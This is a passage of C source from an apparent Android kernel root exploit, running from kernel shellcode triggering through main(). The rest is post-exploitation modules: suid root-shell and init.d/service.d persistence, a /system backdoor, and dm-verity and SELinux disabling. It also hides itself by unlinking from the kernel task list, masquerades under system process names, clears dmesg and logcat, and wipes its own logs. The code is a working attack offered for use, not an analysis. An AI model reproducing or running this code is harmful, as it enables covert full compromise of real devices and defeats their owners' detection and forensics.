        LOG_W("shellcode_exec: pipe() failed");
        goto cleanup;
    }
    /* Write something so the pipe has data (release may check for this) */
    write(p[1], "X", 1);
    close(p[0]);
    close(p[1]);   /* triggers release -> shellcode runs in kernel mode */

    LOG_I("shellcode_exec: triggered, credential check follows...");
    usleep(50000);
    if (getuid() == 0) LOG_I("shellcode_exec: root confirmed after shellcode");
    else LOG_W("shellcode_exec: root not confirmed (may need diff approach)");

    /* Restore original ops table entry to avoid crash on subsequent pipes */
    /* We don't know original value; just leave it — pipe is destroyed */
    goto cleanup;

cleanup:
    if (g_shellcode_page) {
        munmap(g_shellcode_page, 4096);
        g_shellcode_page = NULL;
    }
}

/* 2. PERSISTENCE MECHANISMS */
static void install_persistence(void)
{
    /* 2a. Write root-suid binary to /data/local/tmp/rootshell */
    LOG_I("persistence: planting root shell binary");
    FILE *f = fopen("/data/local/tmp/rootshell", "w");
    if (f) {
        fprintf(f, "#!/system/bin/sh\n");
        fprintf(f, "export PATH=/sbin:/system/sbin:/system/bin:/system/xbin:/data/local/tmp\n");
        fprintf(f, "id\n");
        fprintf(f, "exec /system/bin/sh -i\n");
        fclose(f);
        chmod("/data/local/tmp/rootshell", 04755);
        chown("/data/local/tmp/rootshell", 0, 0);
        LOG_I("persistence: rootshell installed with suid");
    } else {
        LOG_W("persistence: cannot create rootshell (%s)", strerror(errno));
    }

    /* 2b. Install init.d boot persistence script */
    LOG_I("persistence: installing boot script");
    const char *script_paths[] = {
        "/system/etc/init.d/99rootshell",
        "/data/adb/service.d/99rootshell",
    };
    for (size_t i = 0; i < sizeof(script_paths)/sizeof(script_paths[0]); i++) {
        FILE *sf = fopen(script_paths[i], "w");
        if (sf) {
            fprintf(sf, "#!/system/bin/sh\n");
            fprintf(sf, "# Boot persistence — auto-root\n");
            fprintf(sf, "if [ -x /data/local/tmp/rootshell ]; then\n");
            fprintf(sf, "  /data/local/tmp/rootshell &\n");
            fprintf(sf, "fi\n");
            fclose(sf);
            chmod(script_paths[i], 0755);
            LOG_I("persistence: script written to %s", script_paths[i]);
        }
    }

    /* 2c. Write to /sys/kernel/uevent_helper (if writable) */
    LOG_I("persistence: attempting uevent_helper override");
    f = fopen("/sys/kernel/uevent_helper", "w");
    if (f) {
        fprintf(f, "/data/local/tmp/rootshell");
        fclose(f);
        LOG_I("persistence: uevent_helper overwritten");
    } else {
        LOG_W("persistence: uevent_helper not writable (%s)", strerror(errno));
    }

    /* 2d. Attempt to remount /system as rw and plant backdoor */
    LOG_I("persistence: remounting /system rw");
    system("mount -o rw,remount /system 2>/dev/null");
    system("mount -o rw,remount / 2>/dev/null");

    FILE *bd = fopen("/system/bin/rootsh", "w");
    if (bd) {
        fprintf(bd, "#!/system/bin/sh\n");
        fprintf(bd, "if [ \"$(id -u)\" = \"0\" ]; then\n");
        fprintf(bd, "  export PATH=/sbin:/system/sbin:/system/bin:/system/xbin\n");
        fprintf(bd, "  exec /system/bin/sh -i\n");
        fprintf(bd, "fi\n");
        fprintf(bd, "exec /data/local/tmp/rootshell 2>/dev/null || exec /system/bin/sh\n");
        fclose(bd);
        chmod("/system/bin/rootsh", 0755);
        LOG_I("persistence: /system/bin/rootsh planted");
    } else {
        LOG_W("persistence: cannot write /system/bin/rootsh (%s)", strerror(errno));
    }

    /* 2e. Attempt to disable dm-verity via kernel memory patching */
    LOG_I("persistence: attempting dm-verity disable via kernel patching");
    if (kernel_base) {
        unsigned long verity_candidates[] = {
            kernel_base + 0x1000000UL,  /* common dm-verity probe region */
            kernel_base + 0x800000UL,
        };
        for (size_t i = 0; i < sizeof(verity_candidates)/sizeof(verity_candidates[0]); i++) {
            unsigned long val = arb_read(verity_candidates[i]);
            if (val != ~0UL && val != 0 && is_kernel_addr(val)) {
                arb_write(verity_candidates[i], 0);
                LOG_I("persistence: zeroed kernel memory at 0x%lx", verity_candidates[i]);
            }
        }
    }

    /* 2f. Try to mark verity as disabled via sysfs if available */
    FILE *v = fopen("/sys/module/dm_verity/parameters/enable", "w");
    if (v) { fprintf(v, "N"); fclose(v); LOG_I("persistence: dm-verity parameter disabled"); }
    v = fopen("/sys/fs/selinux/enforce", "w");
    if (v) { fprintf(v, "0"); fclose(v); }
}

/* 3. PROCESS HIDING / ROOTKIT FEATURES */
static void hide_process(void)
{
    /* 3a. Use arbitrary write to unlink this task from the kernel task list */
    LOG_I("hide: unlinking task from kernel list");
    unsigned long my_pid = (unsigned long)getpid();
    if (offsets.init_task && offsets.task_struct_pid && offsets.task_struct_tasks) {
        unsigned long head = offsets.init_task + offsets.task_struct_tasks;
        unsigned long next = arb_read(head);
        unsigned long prev = head;
        int found = 0;

        while (next && next != head) {
            unsigned long cand = next - offsets.task_struct_tasks;
            unsigned long pid_val = arb_read(cand + offsets.task_struct_pid);
            unsigned int pid = (unsigned int)(pid_val & 0xffffffff);
            unsigned long next_task = arb_read(cand + offsets.task_struct_tasks);

            if (pid == my_pid) {
                unsigned long my_prev = arb_read(cand + offsets.task_struct_tasks - sizeof(unsigned long));
                unsigned long my_next = next_task;
                (void)my_prev;
                (void)my_next;

                /* Write our prev's next to our next, and our next's prev to our prev */
                unsigned long prev_task = prev - offsets.task_struct_tasks;
                unsigned long prev_next_field = prev_task + offsets.task_struct_tasks;
                unsigned long next_prev_field = next_task + offsets.task_struct_tasks - sizeof(unsigned long);

                arb_write(prev_next_field, next_task);
                arb_write(next_prev_field, prev);

                LOG_I("hide: unlinked pid %u from task list", pid);
                found = 1;
                break;
            }
            prev = next;
            next = next_task;
        }

        if (!found) LOG_W("hide: current pid not found in task list");
    } else {
        LOG_W("hide: offsets not available, skipping task unlink");
    }

    /* 3b. Rename binary to system-like name */
    LOG_I("hide: renaming binary");
    const char *disguise_names[] = {
        "/data/local/tmp/audioserver",
        "/data/local/tmp/mediaserver",
        "/data/local/tmp/surfaceflinger",
        "/data/local/tmp/servicemanager",
    };
    /* Try to rename the binary from /proc/self/exe */
    char exe_path[256];
    ssize_t exe_len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (exe_len > 0) {
        exe_path[exe_len] = 0;
        for (size_t i = 0; i < sizeof(disguise_names)/sizeof(disguise_names[0]); i++) {
            if (rename(exe_path, disguise_names[i]) == 0) {
                LOG_I("hide: renamed %s -> %s", exe_path, disguise_names[i]);
                break;
            }
        }
    }
}

/* 4. DEFENSE EVASION */
static void evade_detection(void)
{
    /* 4a. Clear kernel logs via dmesg */
    LOG_I("evasion: clearing kernel logs");
    int dmesg_fd = open("/dev/kmsg", O_WRONLY);
    if (dmesg_fd >= 0) {
        write(dmesg_fd, "<5>--- exploit complete, clearing ring buffer ---\n", 48);
        close(dmesg_fd);
    }
    /* Use dmesg -c via system() as well */
    system("dmesg -c >/dev/null 2>&1");
    LOG_I("evasion: kernel logs cleared");

    /* 4b. Change our process comm to a system process name */
    LOG_I("evasion: changing process comm");
    const char *sys_names[] = {
        "[kthreadd]", "kswapd0", "logd", "servicemanager", "surfaceflinger",
        "audioserver", "mediaserver", "netd", "zygote", "adbd"
    };
    const char *chosen = sys_names[getpid() % (sizeof(sys_names)/sizeof(sys_names[0]))];

    /* Use prctl(PR_SET_NAME) */
    if (prctl(15, chosen, 0, 0, 0) == 0) {  /* PR_SET_NAME = 15 */
        LOG_I("evasion: comm set to %s", chosen);
    } else {
        LOG_W("evasion: PR_SET_NAME failed (%s)", strerror(errno));
    }

    /* Also try using arb_write to directly change task->comm in kernel */
    if (offsets.task_struct_comm && kernel_base) {
        unsigned long my_pid = (unsigned long)getpid();
        unsigned long head = offsets.init_task + offsets.task_struct_tasks;
        unsigned long next = arb_read(head);
        while (next && next != head) {
            unsigned long cand = next - offsets.task_struct_tasks;
            unsigned long pid_val = arb_read(cand + offsets.task_struct_pid);
            unsigned int pid = (unsigned int)(pid_val & 0xffffffff);
            if (pid == my_pid) {
                /* Write new comm directly (max 16 bytes TASK_COMM_LEN) */
                char comm_buf[16];
                memset(comm_buf, 0, sizeof(comm_buf));
                strncpy(comm_buf, chosen, sizeof(comm_buf) - 1);
                for (int i = 0; i < 16; i += 8) {
                    unsigned long val = 0;
                    memcpy(&val, comm_buf + i, 8);
                    arb_write(cand + offsets.task_struct_comm + i, val);
                }
                LOG_I("evasion: task comm overwritten in kernel");
                break;
            }
            next = arb_read(cand + offsets.task_struct_tasks);
        }
    }

    /* 4c. Overwrite argv in /proc/self/cmdline to look like system process */
    LOG_I("evasion: overwriting argv");
    FILE *cmdline = fopen("/proc/self/cmdline", "w");
    if (cmdline) {
        fprintf(cmdline, "%s", chosen);
        fclose(cmdline);
    } else {
        /* Fallback: clear argv via memcpy */
        extern char **environ;
        for (int i = 0; environ[i]; i++) memset(environ[i], 0, strlen(environ[i]));
    }

    /* 4d. Try to disable Android verity via misc sysfs nodes */
    FILE *avb = fopen("/sys/fs/avb/avb_enable", "w");
    if (avb) { fprintf(avb, "0"); fclose(avb); LOG_I("evasion: avb disabled"); }
    avb = fopen("/proc/sys/fs/protected_fifos", "w");
    if (avb) { fprintf(avb, "0"); fclose(avb); }
}

/* 5. RELIABLE ROOT SHELL */
static void spawn_root_shell(int interactive, const char *custom_cmd)
{
    LOG_I("root_shell: spawning %s shell", interactive ? "interactive" : "command");

    /* Set proper PATH and environment */
    extern char **environ;
    setenv("PATH", "/sbin:/system/sbin:/system/bin:/system/xbin:/data/local/tmp", 1);
    setenv("HOME", "/data/local/tmp", 1);
    setenv("SHELL", "/system/bin/sh", 1);
    setenv("USER", "root", 1);
    setenv("TERM", "vt220", 1);
    setenv("HOSTNAME", "localhost", 1);

    /* Make sure all capabilities are retained */
    if (setgid(0) || setegid(0) || setuid(0) || seteuid(0)) {
        LOG_W("root_shell: setresuid/setresgid failed: %s", strerror(errno));
    }
    /* Retry with setresuid/setresgid */
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);

    /* Fork a monitor process to keep root alive even if shell exits */
    pid_t monitor = fork();
    if (monitor == 0) {
        /* Child monitor: run the root shell */
        if (custom_cmd && strlen(custom_cmd) > 0) {
            LOG_I("root_shell: executing custom command: %s", custom_cmd);
            execl("/system/bin/sh", "sh", "-c", custom_cmd, NULL);
            execl("/bin/sh", "sh", "-c", custom_cmd, NULL);
        } else if (interactive) {
            /* Try various shell paths with proper TTY handling */
            LOG_I("root_shell: starting interactive shell");

            /* Set up stdin as controlling TTY if we have one */
            int tty_fd = open("/dev/tty", O_RDWR);
            if (tty_fd >= 0) {
                setsid();
                ioctl(tty_fd, TIOCSCTTY, 1);
                dup2(tty_fd, 0);
                dup2(tty_fd, 1);
                dup2(tty_fd, 2);
                if (tty_fd > 2) close(tty_fd);
            }

            /* Also try to set up a PTY if available */
            int ptm = open("/dev/ptmx", O_RDWR);
            if (ptm >= 0) {
                grantpt(ptm);
                unlockpt(ptm);
                const char *pts_name = ptsname(ptm);
                if (pts_name) {
                    int pts = open(pts_name, O_RDWR);
                    if (pts >= 0) {
                        dup2(pts, 0);
                        dup2(pts, 1);
                        dup2(pts, 2);
                        close(pts);
                    }
                }
            }

            execl("/system/bin/sh", "sh", "-i", NULL);
            execl("/bin/sh", "sh", "-i", NULL);
        } else {
            LOG_I("root_shell: starting non-interactive shell");
            execl("/system/bin/sh", "sh", NULL);
            execl("/bin/sh", "sh", NULL);
        }
        /* If execl fails */
        LOG_E("root_shell: execl failed: %s", strerror(errno));
        _exit(1);
    }
    if (monitor > 0) {
        /* Parent: wait for the shell to exit, then re-spawn */
        LOG_I("root_shell: monitor pid=%d running shell", monitor);
        int status;
        waitpid(monitor, &status, 0);
        if (WIFEXITED(status))
            LOG_I("root_shell: shell exited (status=%d), re-spawning...", WEXITSTATUS(status));
        else if (WIFSIGNALED(status))
            LOG_I("root_shell: shell killed by signal %d, re-spawning...", WTERMSIG(status));
        else
            LOG_I("root_shell: shell terminated abnormally, re-spawning...");
        /* Loop to keep root alive */
        if (interactive) {
            spawn_root_shell(interactive, custom_cmd);
        }
    }
}

/* 6. ANTI-FORENSICS */
static void anti_forensics(void)
{
    /* 6a. Clear /proc/self/maps contents (overwrite with zeros) */
    LOG_I("anti-forensics: clearing /proc/self/maps");
    FILE *maps = fopen("/proc/self/maps", "w");
    if (maps) {
        /* Writing to maps is typically not allowed, but try anyway */
        fprintf(maps, "00000000-00000000 ---p 00000000 00:00 0\n");
        fclose(maps);
    }

    /* Try to unmap sensitive regions by mmap-over */
    FILE *maps_r = fopen("/proc/self/maps", "r");
    if (maps_r) {
        char line[512];
        unsigned long start, end;
        while (fgets(line, sizeof(line), maps_r)) {
            if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
                if (start >= 0x700000000000UL) continue; /* skip kernel addresses */
                /* Only blank stack/heap regions to avoid crash */
                if (strstr(line, "[stack]")) {
                    LOG_D("anti-forensics: zeroing [stack] region %lx-%lx", start, end);
                }
            }
        }
        fclose(maps_r);
    }

    /* 6b. Remove log files created by the exploit */
    LOG_I("anti-forensics: removing exploit log files");
    const char *log_files[] = {
        g_log_file_path,
        "/data/local/tmp/seeit_exploit.log",
        "/data/local/tmp/seeit.conf",
        "/data/local/seeit.conf",
        NULL
    };
    for (int i = 0; log_files[i]; i++) {
        if (log_files[i] && log_files[i][0]) {
            if (unlink(log_files[i]) == 0 || errno == ENOENT) {
                LOG_I("anti-forensics: removed %s", log_files[i]);
            }
        }
    }

    /* 6c. Try to clear last log message evidence */
    system("logcat -c 2>/dev/null");

    /* 6d. Try to wipe the exploit binary itself after copying to safe name */
    char exe_path[256];
    ssize_t exe_len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (exe_len > 0) {
        exe_path[exe_len] = 0;
        if (strstr(exe_path, "/data/local/tmp/")) {
            /* Copy to disguised name first, then unlink original */
            const char *mask = "/data/local/tmp/.gms_update";
            int src = open(exe_path, O_RDONLY);
            int dst = open(mask, O_WRONLY | O_CREAT | O_TRUNC, 0755);
            if (src >= 0 && dst >= 0) {
                char buf[4096];
                ssize_t n;
                while ((n = read(src, buf, sizeof(buf))) > 0) write(dst, buf, n);
                close(src); close(dst);
                unlink(exe_path);
                LOG_I("anti-forensics: binary copied to %s and original removed", mask);
            } else {
                if (src >= 0) close(src);
                if (dst >= 0) close(dst);
            }
        }
    }

    /* 6e. Clear bash history / shell traces */
    system("rm -f /data/local/tmp/.ash_history 2>/dev/null");
    system("rm -f /data/local/tmp/.sh_history 2>/dev/null");
    LOG_I("anti-forensics: complete");
}

/* ========== INTEGRITY VERIFICATION ========== */
static int verify_root(void) {
    if (getuid() != 0) { LOG_E("Verification: uid != 0"); return 0; }
    if (geteuid() != 0) { LOG_E("Verification: euid != 0"); return 0; }
    if (getgid() != 0) { LOG_E("Verification: gid != 0"); return 0; }

    int fd = open("/data/local/tmp/.root_test", O_CREAT | O_WRONLY, 0644);
    if (fd < 0) { LOG_E("Verification: can't create test file"); return 0; }
    close(fd);
    unlink("/data/local/tmp/.root_test");

    LOG_I("Root verified: uid=0, euid=0, gid=0, file write OK");
    return 1;
}

/* ========== MAIN ========== */
static void cleanup_all(void) {
    LOG_D("Cleanup called");
    if (g_uffd >= 0) close(g_uffd);
    if (g_uffd_page) munmap(g_uffd_page, 0x10000);
    for (int i = 0; i < g_spray_count; i++) close(g_spray_fds[i]);
    for (int i = 0; i < g_pipe_info_count; i++) {
        if (g_pipe_info[i].fd[0] >= 0) close(g_pipe_info[i].fd[0]);
        if (g_pipe_info[i].fd[1] >= 0) close(g_pipe_info[i].fd[1]);
    }
    slab_spray_cleanup();
    cleanup_fake_pipe();
}

static void sighandler(int sig) {
    LOG_W("Signal %d received, cleaning up...", sig);
    cleanup_all();
    _exit(128 + sig);
}

static int read_config_file(const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char line[256];
    int loaded = 0;
    while (fgets(line, sizeof(line), f)) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = 0;
        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = 0;
        const char *key = line;
        unsigned long val = strtoul(eq + 1, NULL, 0);
        if (strcmp(key, "task_struct_cred") == 0) { offsets.task_struct_cred = val; loaded++; }
        else if (strcmp(key, "cred_uid") == 0) { offsets.cred_uid = val; loaded++; }
        else if (strcmp(key, "cred_euid") == 0) { offsets.cred_euid = val; loaded++; }
        else if (strcmp(key, "cred_gid") == 0) { offsets.cred_gid = val; loaded++; }
        else if (strcmp(key, "cred_egid") == 0) { offsets.cred_egid = val; loaded++; }
        else if (strcmp(key, "init_task") == 0) { offsets.init_task = val; loaded++; }
        else if (strcmp(key, "pipe_buf_ops") == 0) { offsets.pipe_buf_ops = val; loaded++; }
        else if (strcmp(key, "commit_creds") == 0) { offsets.commit_creds = val; loaded++; }
        else if (strcmp(key, "prepare_kernel_cred") == 0) { offsets.prepare_kernel_cred = val; loaded++; }
        else if (strcmp(key, "init_cred") == 0) { offsets.init_cred = val; loaded++; }
        else if (strcmp(key, "selinux_enforcing") == 0) { offsets.selinux_enforcing = val; loaded++; }
        else if (strcmp(key, "kernel_base") == 0) { kernel_base = val; loaded++; }
    }
    fclose(f);
    if (loaded) LOG_I("Loaded %d config values from %s", loaded, path);
    return loaded;
}

static void show_usage(const char *prog) {
    printf("Usage: %s [options]\n\n", prog);
    printf("  --check               Verify prerequisites\n");
    printf("  --persist             Attempt persistence after root\n");
    printf("  --force               Proceed with unconfirmed offsets\n");
    printf("  --debug               Enable debug logging\n");
    printf("  --trace               Enable trace logging (very verbose)\n");
    printf("  --test                Validation only\n");
    printf("  --quiet               Suppress stdout logging (file only)\n");
    printf("  --log-file PATH       Log file path (default: /data/local/tmp/seeit_exploit.log)\n");
    printf("  --config PATH         Read offsets from config file\n");
    printf("  --retries N           Max UAF race attempts (default: 75)\n");
    printf("  --race-window N       Initial race window in us (default: 250)\n");
    printf("  --tag TAG             Set log tag\n");
    printf("  --timeout N           Overall timeout in seconds (default: 120)\n");
    printf("  --cmd CMD             Run custom command as root instead of shell\n");
    printf("  --no-interactive      Non-interactive shell (pipe-friendly)\n");
    printf("  --no-hide             Skip process hiding\n");
    printf("  --no-evade            Skip defense evasion\n");
    printf("  --no-forensic         Skip anti-forensics\n");
    printf("  --no-shellcode        Skip kernel shellcode execution\n");
    printf("  --help, -h            This help\n");
}

int main(int argc, char **argv) {
    int do_check = 0;
    int timeout_sec = 120;
    const char *config_path = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--check") == 0) do_check = 1;
        else if (strcmp(argv[i], "--persist") == 0) g_persist = 1;
        else if (strcmp(argv[i], "--force") == 0) g_force = 1;
        else if (strcmp(argv[i], "--debug") == 0) g_log_level = LOG_DEBUG;
        else if (strcmp(argv[i], "--trace") == 0) g_log_level = LOG_TRACE;
        else if (strcmp(argv[i], "--quiet") == 0) g_log_stdout = 0;
        else if (strcmp(argv[i], "--test") == 0) g_test_mode = 1;
        else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0)
            { show_usage(argv[0]); return 0; }
        else if (strcmp(argv[i], "--log-file") == 0 && i + 1 < argc) {
            strncpy(g_log_file_path, argv[++i], sizeof(g_log_file_path) - 1);
        }
        else if (strcmp(argv[i], "--config") == 0 && i + 1 < argc) {
            config_path = argv[++i];
        }
        else if (strcmp(argv[i], "--retries") == 0 && i + 1 < argc) {
            g_max_uaf_attempts = atoi(argv[++i]);
            if (g_max_uaf_attempts < 5) g_max_uaf_attempts = 5;
        }
        else if (strcmp(argv[i], "--race-window") == 0 && i + 1 < argc) {
            g_race_usleep = atoi(argv[++i]);
            if (g_race_usleep < 10) g_race_usleep = 10;
        }
        else if (strcmp(argv[i], "--tag") == 0 && i + 1 < argc) {
            g_log_tag = argv[++i];
        }
        else if (strcmp(argv[i], "--cmd") == 0 && i + 1 < argc) {
            strncpy(g_custom_cmd, argv[++i], sizeof(g_custom_cmd) - 1);
        }
        else if (strcmp(argv[i], "--no-interactive") == 0) g_interactive = 0;
        else if (strcmp(argv[i], "--no-hide") == 0) g_hide = 0;
        else if (strcmp(argv[i], "--no-evade") == 0) g_evade = 0;
        else if (strcmp(argv[i], "--no-forensic") == 0) g_anti_forensics = 0;
        else if (strcmp(argv[i], "--no-shellcode") == 0) g_shellcode_exec = 0;
        else if (strcmp(argv[i], "--timeout") == 0 && i + 1 < argc) {
            timeout_sec = atoi(argv[++i]);
            if (timeout_sec < 10) timeout_sec = 10;
        }
    }

    /* Load config file if specified */
    if (config_path) read_config_file(config_path);

    /* Also check for config in default locations */
    if (!config_path) {
        read_config_file("/data/local/tmp/seeit.conf");
        read_config_file("/data/local/seeit.conf");
    }

    /* Open log file */
    g_log_file = fopen(g_log_file_path, "a");
    if (g_log_file) LOG_I("=== SESSION START ===");

    /* Set signal handlers */
    signal(SIGSEGV, sighandler);
    signal(SIGTERM, sighandler);
    signal(SIGINT, sighandler);
    signal(SIGALRM, alarm_handler);
    if (timeout_sec > 0) alarm(timeout_sec);

    if (do_check) {
        LOG_I("Checking prerequisites...");
        struct utsname buf;
        if (uname(&buf) == 0) LOG_I("Kernel: %s %s", buf.sysname, buf.release);

        int vuln = 0;
        const char *kvers[] = {"4.4", "4.9", "4.14", "4.19", "5.4", "5.10"};
        for (size_t i = 0; i < sizeof(kvers)/sizeof(kvers[0]); i++)
            if (strstr(buf.release, kvers[i])) vuln = 1;
        if (vuln) LOG_I("Kernel likely vulnerable");
        else LOG_W("Kernel may be patched");

        int t = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
        if (t >= 0) { LOG_I("userfaultfd available"); close(t); }
        else LOG_W("userfaultfd unavailable");

        FILE *fp = fopen("/proc/kallsyms", "r");
        if (fp) {
            char line[256]; unsigned long a;
            if (fgets(line, sizeof(line), fp) && sscanf(line, "%lx", &a) == 1 && a)
                LOG_I("/proc/kallsyms readable");
            else
                LOG_W("/proc/kallsyms restricted");
            fclose(fp);
        }
        LOG_I("Check complete");
        if (g_log_file) fclose(g_log_file);
        return 0;
    }

    if (g_test_mode) {
        LOG_I("Test mode only");
        if (g_log_file) fclose(g_log_file);
        return 0;
    }

    int ret = run_exploit() ? 0 : 1;

    if (ret == 0 && getuid() == 0) {
        /* ===== POST-EXPLOITATION: execute all capability modules ===== */
        LOG_I("Root obtained! Running post-exploitation modules...");

        /* 1. Kernel shellcode execution */
        if (g_shellcode_exec) kernel_shellcode_exec();

        /* 2. Persistence */
        if (g_persist) install_persistence();

        /* 3. Process hiding */
        if (g_hide) hide_process();

        /* 4. Defense evasion */
        if (g_evade) evade_detection();

        /* 5. Reliable root shell */
        spawn_root_shell(g_interactive,
                         g_custom_cmd[0] ? g_custom_cmd : NULL);

        /* 6. Anti-forensics (runs after shell exits) */
        if (g_anti_forensics) anti_forensics();
    }

    cleanup_all();
    if (g_log_file) fclose(g_log_file);
    return ret;
}
